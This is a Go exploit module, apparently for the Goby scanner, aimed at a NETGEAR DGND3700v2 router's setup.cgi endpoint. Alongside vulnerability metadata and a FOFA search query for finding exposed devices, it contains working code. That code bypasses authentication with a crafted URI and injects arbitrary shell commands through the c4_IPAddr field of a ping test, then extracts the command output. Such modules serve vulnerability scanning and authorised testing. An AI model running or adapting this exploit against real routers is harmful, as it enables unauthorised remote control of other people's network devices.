package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NETGEAR DGND3700v2 setup.cgi Api RCE Vulnerability",
    "Description": "<p>The NETGEAR DGND3700v2 is an efficient enterprise router.</p><p>NETGEAR DGND3700v2 has a command execution vulnerability, an attacker can execute arbitrary commands and control server permissions.</p>",
    "Impact": "<p>NETGEAR DGND3700v2 has a command execution vulnerability, an attacker can execute arbitrary commands and control server permissions.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "NETGEAR DGND3700v2",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "NETGEAR DGND3700v2 路由器 setup.cgi 接口远程命令执行漏洞",
            "Product": "NETGEAR DGND3700v2",
            "Description": "<p>NETGEAR DGND3700v2 是一款高效的企业路由器。</p><p>NETGEAR DGND3700v2 存在命令执行漏洞，攻击者可执行任意命令，控制服务器权限。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>NETGEAR DGND3700v2 存在命令执行漏洞，攻击者可执行任意命令，控制服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "NETGEAR DGND3700v2 setup.cgi Api RCE Vulnerability",
            "Product": "NETGEAR DGND3700v2",
            "Description": "<p>The NETGEAR DGND3700v2 is an efficient enterprise router.</p><p>NETGEAR DGND3700v2 has a command execution vulnerability, an attacker can execute arbitrary commands and control server permissions.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">NETGEAR DGND3700v2 has a command execution vulnerability, an attacker can execute arbitrary commands and control server permissions.</span><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"DGND3700v2\"",
    "GobyQuery": "title=\"DGND3700v2\"",
    "Author": "keeeee",
    "Homepage": "https://www.netgear.com/",
    "DisclosureDate": "2022-02-21",
    "References": [
        "https://ssd-disclosure.com/ssd-advisory-netgear-dgnd3700v2-preauth-root-access/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-22338"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/bin/ls",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10260"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/setup.cgi?id=0&sp=1337foo=currentsetting.htm"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			c4_IPAddr := url.QueryEscape("127 || echo 202cb962ac5''7152d234b70")
			data := fmt.Sprintf("todo=ping_test&c4_IPAddr=%s&next_file=diagping.htm", c4_IPAddr)
			cfg.Data = data
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "202cb962ac57152d234b70")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/setup.cgi?id=0&sp=1337foo=currentsetting.htm"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			c4_IPAddr := url.QueryEscape(fmt.Sprintf("127 || echo 202cb962ac5 && %s && echo 7152d234b70", cmd))
			data := fmt.Sprintf("todo=ping_test&c4_IPAddr=%s&next_file=diagping.htm", c4_IPAddr)
			cfg.Data = data
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					reg := regexp.MustCompile(`(?s)202cb962ac5(.*)7152d234b70`)
					result := reg.FindStringSubmatch(resp.Utf8Html)
					if len(result) > 0 {
						expResult.Output = result[1]
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
